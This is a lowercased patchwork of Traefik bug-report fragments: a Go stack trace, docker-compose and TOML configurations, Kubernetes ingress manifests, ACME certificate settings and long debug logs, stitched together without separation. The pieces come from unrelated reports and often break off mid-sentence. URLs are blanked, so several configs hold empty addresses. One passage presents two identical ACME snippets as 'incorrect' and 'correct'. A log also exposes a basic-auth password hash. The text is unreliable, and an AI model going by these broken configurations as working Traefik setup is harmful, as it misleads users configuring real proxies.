apr 15 08:27:06 ip-10-0-63-244 traefik: internal/poll.(*fd).read( , , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/internal/poll/fd_unix.go:169 +
apr 15 08:27:06 ip-10-0-63-244 traefik: net.(*netfd).read( , , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/fd_unix.go:202 +
apr 15 08:27:06 ip-10-0-63-244 traefik: net.(*conn).read( , , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/net.go:177 +
apr 15 08:27:06 ip-10-0-63-244 traefik: crypto/tls.(*block).readfromuntil( , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/crypto/tls/conn.go:492 +
apr 15 08:27:06 ip-10-0-63-244 traefik: crypto/tls.(*conn).readrecord( , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/crypto/tls/conn.go:593 +
apr 15 08:27:06 ip-10-0-63-244 traefik: crypto/tls.(*conn).read( , , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/crypto/tls/conn.go:1145 +
apr 15 08:27:06 ip-10-0-63-244 traefik: net/http.(*persistconn).read( , , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/http/transport.go:1497 +
apr 15 08:27:06 ip-10-0-63-244 traefik: bufio.(*reader).fill( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/bufio/bufio.go:100 +
apr 15 08:27:06 ip-10-0-63-244 traefik: bufio.(*reader).peek( , , , , , , )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/bufio/bufio.go:132 +
apr 15 08:27:06 ip-10-0-63-244 traefik: net/http.(*persistconn).readloop( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/http/transport.go:1645 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by net/http.(*transport).dialconn
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/http/transport.go:1338 +
apr 15 08:27:06 ip-10-0-63-244 traefik: goroutine 198 [select, 1 minutes]:
apr 15 08:27:06 ip-10-0-63-244 traefik: net/http.(*persistconn).writeloop( )
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/http/transport.go:1885 +
apr 15 08:27:06 ip-10-0-63-244 traefik: created by net/http.(*transport).dialconn
apr 15 08:27:06 ip-10-0-63-244 traefik: /usr/local/go/src/net/http/transport.go:1339 +
apr 15 08:27:06 ip-10-0-63-244 systemd: traefik.service: main process exited, code=exited, status=2/invalidargument
apr 15 08:27:06 ip-10-0-63-244 systemd: unit traefik.service entered failed state.
apr 15 08:27:06 ip-10-0-63-244 systemd: traefik.service failed.
``` </details>
no config file, only arguments and docker labels: ```yaml traefik: image: traefik:2.0 command: > --api --entrypoints=\'name:web address::8000\' --metrics --metrics.prometheus --providers --providers.docker --providers.docker.exposedbydefault=false --providers.docker.watch --global.sendanonymoususage=true --global.debug --log.loglevel=debug --accesslog something: image: something labels: traefik.enable: true traefik.tcp.routers.something.entrypoints: "web" traefik.tcp.routers.something.rule: "hostsni(`something.${domain}`)" traefik.tcp.routers.something.tls: true traefik.tcp.routers.something.tls.passthrough: true traefik.tcp.services.something.loadbalancer.server.port: 8080
``` ### workaround: ```yaml traefik.tcp.routers.something.tls: "true" # xxx must be a string.
no config file, only arguments:
```yaml traefik: image: traefik:2.0 command: > --api --entrypoints='name:web address::8000' --metrics --metrics.prometheus --providers --providers.docker --providers.docker.exposedbydefault=false --providers.docker.watch --global.sendanonymoususage=false --global.debug --log.loglevel=debug --accesslog
``` ### workaround: with `--global.sendanonymoususage=true` i get in logs:
level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
but i'm not sure is actual stats enabled or disabled - something is inversed, but is it only log message or both log message and sending stats?
```toml [tracing] backend = "zipkin" servicename = "traefik" [tracing.zipkin] httpendpoint = " " debug = true samespan = false id128bit = true
```
gke 1.12.6 ```toml loglevel = "{{ .values.loglevel }}" defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] {{- if .values.acme.enabled }} [[entrypoints.https.tls.certificates]] certfile = "redacted" keyfile = "redacted" {{- else }} ``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
################################################################
# file provider
################################################################ [http] ################################################################ # middlewares ################################################################ [http.middlewares] [http.middlewares.forwardauth.forwardauth] address = " " authresponseheaders = ["authorization", "x-forwardauth-name", "x-forwardauth-sub", "x-forwardauth-email"] ################################################################ # routers ################################################################ [http.routers] [http.routers.router0] entrypoints = ["http"] service = "whoami" rule = "host(`whoami.example.test`)" [http.routers.router1] entrypoints = ["http"] priority = 9999999 service = "oauth" rule = "host(`auth.example.test`)" ################################################################ # services ################################################################ [http.services] [http.services.whoami] [http.services.whoami.loadbalancer] [[http.services.whoami.loadbalancer.servers]] url = " " weight = 1 [http.services.oauth] [http.services.oauth.loadbalancer] [[http.services.oauth.loadbalancer.servers]] url = " " weight = 1
``` output from whoami
hostname: 9c754487d738
ip: 127.0.0.1
ip: 172.17.0.3
get / http/1.1
host: host.docker.internal:8000
user-agent: mozilla/5.0 (windows nt 10.0; win64; x64; rv:65.0) gecko/20100101 firefox/65.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
accept-encoding: gzip, deflate
accept-language: en-us,en;q=0.5
cache-control: no-cache
cookie: auth_nonce=4d060c125a784ac4a24044392749fb42
pragma: no-cache
upgrade-insecure-requests: 1
x-forwarded-for: 172.17.0.1
a sample of ingress for my application with annotations ```yml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: identityserver-ingress annotations: kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/frontend-entry-points: https traefik.ingress.kubernetes.io/redirect-permanent: true spec: rules: - host: login.mynewsite.com http: paths: - backend: servicename: identityserver-svc serviceport: 80 tls: - secretname: traefik-ui-tls-cert
``` one more weird thing the dashboard for traefik didn't work for two days last week no matter what i've done
it just started working by itself yesterday
kubernetes supposed to be the same everywhere
i use 1.11.8 in aks as well as gke, however, in gke everything works like a charm in aks does not.
you can view that here: ### why i am submitting this as a bug report (rather than support) lack of clear examples to get even a simple version of letsencrypt to work is incredibly frustrating
this example ( is the only other place on the internet that has a mention of this issue after a week of looking and that doesn't solve the issue
it's also worth mentioning that here (and elsewhere) has: ```
[acme] # ..
entrypoint = "https" [acme.httpchallenge] entrypoint = "http"
``` which appears to be incorrect
rather it should be the following as far as i can tell: ```
[acme] # ..
entrypoint = "https" [acme.httpchallenge] entrypoint = "http"
``` the above mentioned documentation nor is helpful here
as far as i can tell this is an issue with traefik itself.
################################################################
# global configuration
################################################################ # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
defaultentrypoints = ["http", "https"] # enable debug mode
# default: false
debug = false # log level
# default: "error"
loglevel = "info" #[traefiklog]
# filepath = "/var/logs/traefik/traefik.log" [accesslog] filepath = "/var/logs/traefik/access.log" [accesslog.filters] retryattempts = true minduration = "10ms" statuscodes = ["401", "403"] ################################################################
# entrypoints configuration
################################################################ # entrypoints definition
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls12" [entrypoints.https.redirect] regex = "^ " replacement = " " permanent = true
docker compose:
``` traefik: image: traefik restart: unless-stopped volumes: - ./traefik/traefik.toml:/etc/traefik/traefik.toml - ./traefik/logs:/var/logs/traefik - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro ports: - 8080:8080 - 80:80 - 443:443
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2019-03-13t18:59:12+01:00" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
time="2019-03-13t18:59:12+01:00" level=info msg="traefik version v1.7.9 built on 2019-02-11_11:36:32am"
time="2019-03-13t18:59:12+01:00" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":{\\"file\\":\\"/var/logs/traefik/access.log\\",\\"format\\":\\"common\\",\\"filters\\":{\\"statuscodes\\":[\\"401\\",\\"403\\"],\\"retryattempts\\":true,\\"duration\\":10000000}},\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":{\\"file\\":\\"/var/logs/traefik/traefik.log\\",\\"format\\":\\"common\\"},\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":{\\"entrypoint\\":\\"https\\"},\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":true,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"https\\":{\\"address\\":\\":443\\",\\"tls\\":{\\"minversion\\":\\"versiontls12\\",\\"ciphersuites\\":null,\\"certificates\\":null,\\"clientcafiles\\":null,\\"clientca\\":{\\"files\\":null,\\"optional\\":false},\\"defaultcertificate\\":null,\\"snistrict\\":false},\\"redirect\\":{\\"regex\\":\\"^ ",\\"replacement\\":\\" ",\\"permanent\\":true},\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":{\\"email\\":\\"peter@foo.bar\\",\\"domains\\":[{\\"main\\":\\"foo.bar\\",\\"sans\\":[\\"ha.foo.bar\\",\\"foo.bar\\",\\"www.foo.bar\\",\\"portainer.foo.bar\\",\\"duplicati.foo.bar\\"]}],\\"storage\\":\\"acme.json\\",\\"storagefile\\":\\"\\",\\"ondemand\\":false,\\"onhostrule\\":false,\\"caserver\\":\\" ",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"dnschallenge\\":null,\\"httpchallenge\\":{\\"entrypoint\\":\\"http\\"},\\"tlschallenge\\":null,\\"dnsprovider\\":\\"\\",\\"delaydontcheckdns\\":0,\\"acmelogging\\":true,\\"overridecertificates\\":false,\\"tlsconfig\\":null},\\"defaultentrypoints\\":[\\"http\\",\\"https\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"keeptrailingslash\\":false,\\"web\\":null,\\"docker\\":null,\\"file\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"directory\\":\\"\\",\\"traefikfile\\":\\"/etc/traefik/traefik.toml\\"},\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":null,\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":true,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":null,\\"ping\\":{\\"entrypoint\\":\\"traefik\\"},\\"hostresolver\\":null}"
time="2019-03-13t18:59:12+01:00" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2019-03-13t18:59:12+01:00" level=debug msg="setting acme certificate store from entrypoint: https"
time="2019-03-13t18:59:13+01:00" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-03-13t18:59:13+01:00" level=debug msg="creating entry point redirect http -> https"
time="2019-03-13t18:59:13+01:00" level=debug msg="creating regex redirect https -> ^ -> "
time="2019-03-13t18:59:13+01:00" level=info msg="preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-03-13t18:59:13+01:00" level=debug msg="creating entry point redirect http -> https"
time="2019-03-13t18:59:13+01:00" level=debug msg="creating regex redirect https -> ^ -> "
time="2019-03-13t18:59:13+01:00" level=info msg="preparing server https &{address::443 tls: redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-03-13t18:59:13+01:00" level=info msg="starting server on :80"
time="2019-03-13t18:59:13+01:00" level=info msg="starting server on :8080"
time="2019-03-13t18:59:13+01:00" level=info msg="starting provider configuration.provideraggregator {}"
time="2019-03-13t18:59:13+01:00" level=info msg="starting server on :443"
time="2019-03-13t18:59:13+01:00" level=info msg="starting provider *file.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"directory\\":\\"\\",\\"traefikfile\\":\\"/etc/traefik/traefik.toml\\"}"
time="2019-03-13t18:59:13+01:00" level=info msg="starting provider *acme.provider {\\"email\\":\\"peter@foo.bar\\",\\"acmelogging\\":true,\\"caserver\\":\\" ",\\"storage\\":\\"acme.json\\",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"onhostrule\\":false,\\"ondemand\\":false,\\"dnschallenge\\":null,\\"httpchallenge\\":{\\"entrypoint\\":\\"http\\"},\\"tlschallenge\\":null,\\"domains\\":[{\\"main\\":\\"foo.bar\\",\\"sans\\":[\\"ha.foo.bar\\",\\"foo.bar\\",\\"www.foo.bar\\",\\"portainer.foo.bar\\",\\"duplicati.foo.bar\\"}],\\"store\\":{}}"
time="2019-03-13t18:59:13+01:00" level=info msg="testing certificate renew..."
time="2019-03-13t18:59:13+01:00" level=debug msg="configuration received from provider acme: {}"
``` i tried to search for existing bugs and write in the support channel in slack.
configuration of traefik is done in docker stack configuration file (docker-compose.yml) via command tag
```yml command: > --docker --docker.swarmmode --docker.watch --docker.exposedbydefault=false --constraints=tag==public-gateway --entrypoints=\'name:http address::80\' --entrypoints=\'name:https address::443 tls\' --consul --consul.endpoint="consul-leader:8500" --loglevel=debug --accesslog --api
``` frontend and backend configuration is done by service deploy labels:
* ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) don't think log is relevant, but i can add it if requested
loglevel = "debug" #debug, info, warn, error, fatal, panic
defaultentrypoints = ["http", "https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme]
email = "xxxx"
storage = "/etc/traefik/acme/acme.json"
entrypoint = "https"
acmelogging = true
onhostrule = true [acme.dnschallenge] provider = "cloudflare" delaybeforecheck = 0 [[acme.domains]] main = "*.xxxx.is" sans = ["xxxx.is"] [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "xxxx.is"
watch = true
exposedbydefault = false [file] filename = "/rules.toml" watch = true
entrypoint = "traefik"
dashboard = true
address = ":8080"
running traefik via docker and have the following variables set for the container;
cf_api_email: me@domain.is
cf_api_key: <api key - also regenerated it to see if this helps but it didn't>
--> ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2019-03-11t10:01:08z" level=info msg="legolog: [info] [*.xxxx.is, xxxx.is] acme: obtaining bundled san certificate"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [*.xxxx.is] authurl: "
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [xxxx.is] authurl: "
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [xxxx.is] acme: could not find solver for: tls-alpn-01"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [xxxx.is] acme: could not find solver for: http-01"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [xxxx.is] acme: use dns-01 solver"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [*.xxxx.is] acme: use dns-01 solver"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [xxxx.is] acme: preparing to solve dns-01"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [*.xxxx.is] acme: preparing to solve dns-01"
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [xxxx.is] acme: cleaning dns-01 challenge"
time="2019-03-11t10:01:09z" level=info msg="legolog: [warn] [xxxx.is] acme: error cleaning up: cloudflare: failed to find zone is.: zone could not be found "
time="2019-03-11t10:01:09z" level=info msg="legolog: [info] [*.xxxx.is] acme: cleaning dns-01 challenge"
time="2019-03-11t10:01:10z" level=info msg="legolog: [warn] [*.xxxx.is] acme: error cleaning up: cloudflare: failed to find zone is.: zone could not be found "
```toml debug = false loglevel = "error" defaultentrypoints = ["http", "https"] [api] entrypoint = "traefik" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [entrypoints.traefik] address = ":8080" [entrypoints.traefik.auth.basic] users = ["user:$key"] [retry] [docker] endpoint = "unix:///var/run/docker.sock" domain = "domain.com" watch = true exposedbydefault = false [acme] email = "user@domain.com" storage = "acme.json" entrypoint = "https" onhostrule = true [acme.httpchallenge] entrypoint = "http" ```
```toml defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.forwardedheaders] trustedips = ["<load-balancer-ip>/32", "<load-balancer-ip>/32"] [entrypoints.traefik] address = ":8080" [entrypoints.traefik.auth.basic] users = ["admin:<secret>"] [kubernetes] [kubernetes.ingressendpoint] publishedservice = "default/myservice" [ping] entrypoint = "http" [api] entrypoint = "traefik"
here the ingress where i define the whitelist ```
apiversion: extensions/v1beta1
kind: ingress
metadata: name: frontend-ingress annotations: kubernetes.io/ingress.class: traefik traefik.frontend.rule.type: pathprefixstrip
# ingress.kubernetes.io/whitelist-x-forwarded-for: "true"
# traefik.ingress.kubernetes.io/whitelist-source-range: "<whitelist-ip-subnet>/24, <whitelist-ip-subnet>/24"
spec: rules: - host: http: paths: - path: /mypath backend: servicename: myservice serviceport: myserviceport
and traefik is exposed like this ```
kind: service
apiversion: v1
metadata: name: traefik-ingress-controller labels: app: traefik-ingress-controller annotations: {}
spec: selector: app: traefik-ingress-controller ports: - protocol: tcp port: 80 targetport: 80 nodeport: 30080 name: http type: nodeport externaltrafficpolicy: local ---
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
time="2019-03-01t13:57:15z" level=info msg="using toml configuration file /config/traefik.toml"
time="2019-03-01t13:57:15z" level=info msg="traefik version v1.7.6 built on 2018-12-14_06:43:37am"
time="2019-03-01t13:57:15z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":false,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":null,\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":false,\\"trustedips\\":[\\"<loadbalancer-ip-1>/32\\",\\"<loadbalancer-ip-2>/32\\"]}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":{\\"basic\\":{\\"users\\":[\\"admin:$apr1$fv9q2vja$gjt2ut8bt6dt6rvdm5qi20\\"]}},\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"keeptrailingslash\\":false,\\"web\\":null,\\"docker\\":null,\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":{\\"ip\\":\\"\\",\\"hostname\\":\\"\\",\\"publishedservice\\":\\"default/anotherservice\\"}},\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":false,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":null,\\"ping\\":{\\"entrypoint\\":\\"http\\"},\\"hostresolver\\":null}"
time="2019-03-01t13:57:15z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2019-03-01t13:57:15z" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-03-01t13:57:15z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth: whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2019-03-01t13:57:15z" level=info msg="starting provider configuration.provideraggregator {}"
time="2019-03-01t13:57:15z" level=info msg="starting server on :80"
time="2019-03-01t13:57:15z" level=info msg="starting server on :8080"
time="2019-03-01t13:57:15z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":{\\"ip\\":\\"\\",\\"hostname\\":\\"\\",\\"publishedservice\\":\\"default/anotherservice\\"}}"
time="2019-03-01t13:57:15z" level=debug msg="using ingress label selector: \\"\\""
time="2019-03-01t13:57:15z" level=info msg="ingress label selector is: \\"\\""
time="2019-03-01t13:57:15z" level=info msg="creating in-cluster provider client"
time="2019-03-01t13:57:16z" level=debug msg="received kubernetes event kind *v1.endpoints"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="received kubernetes event kind *v1.secret"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/frontend-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/service-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/other-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/whitelist-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping updating ingress default/traefik-dashboard-ingress due to service default/anotherservice having no status set"
time="2019-03-01t13:57:16z" level=debug msg="skipping kubernetes event kind *v1.secret"
time="2019-03-01t13:57:16z" level=debug msg="configuration received from provider kubernetes: {\\"backends\\":{\\"/fe\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/promo\\":{\\"servers\\":{\\"promo-api-service-7d5968c556-rrfk2\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/anotherservice\\":{\\"servers\\":{\\"anotherservice-7856788888-dwnjc\\":{\\"url\\":\\" ",\\"weight\\":1},\\"anotherservice-7856788888-kczj5\\":{\\"url\\":\\" ",\\"weight\\":1},\\"anotherservice-7856788888-sxtzt\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/sockjs-node\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/static\\":{\\"servers\\":{\\"myservice-5c55585b8-cxprc\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"/traefik\\":{\\"servers\\":{\\"traefik-ingress-controller-5945dd5fbf-hkt6p\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"/fe\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/fe\\",\\"routes\\":{\\"/fe\\":{\\"rule\\":\\"pathprefixstrip:/fe\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null,\\"whitelist\\":{\\"sourcerange\\":[\\"<whitelisted-ip-subnet>/24\\",\\"<whitelisted-ip-subnet>/24\\"],\\"usexforwardedfor\\":true}},\\"/promo\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/promo\\",\\"routes\\":{\\"/promo\\":{\\"rule\\":\\"pathprefix:/promo\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/anotherservice\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/anotherservice\\",\\"routes\\":{\\"/anotherservice\\":{\\"rule\\":\\"pathprefixstrip:/anotherservice\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/sockjs-node\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/sockjs-node\\",\\"routes\\":{\\"/sockjs-node\\":{\\"rule\\":\\"pathprefix:/sockjs-node\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/static\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/static\\",\\"routes\\":{\\"/static\\":{\\"rule\\":\\"pathprefix:/static\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"/traefik\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"/traefik\\",\\"routes\\":{\\"/traefik\\":{\\"rule\\":\\"pathprefixstrip:/traefik\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2019-03-01t13:57:16z" level=debug msg="wiring frontend /fe to entrypoint http"
time="2019-03-01t13:57:16z" level=debug msg="creating backend /fe"
time="2019-03-01t13:57:16z" level=debug msg="configured ip white list: [<whitelisted-ip-subnet>/24 <whitelisted-ip-subnet>/24]"
time="2019-03-01t13:57:16z" level=debug msg="configured ip whitelists: [<whitelisted-ip-subnet>/24 <whitelisted-ip-subnet>/24]"
time="2019-03-01t13:57:16z" level=debug msg="adding tlsclientheaders middleware for frontend /fe"
time="2019-03-01t13:57:16z" level=debug msg="creating load-balancer wrr"
time="2019-03-01t13:57:16z" level=debug msg="creating server myservice-5c55585b8-cxprc at with weight 1"
time="2019-03-01t13:57:16z" level=debug msg="creating route /fe pathprefixstrip:/fe"
time="2019-03-01t13:57:16z" level=debug msg="wiring frontend /promo to entrypoint http"
time="2019-03-01t13:57:16z" level=debug msg="creating backend /promo"
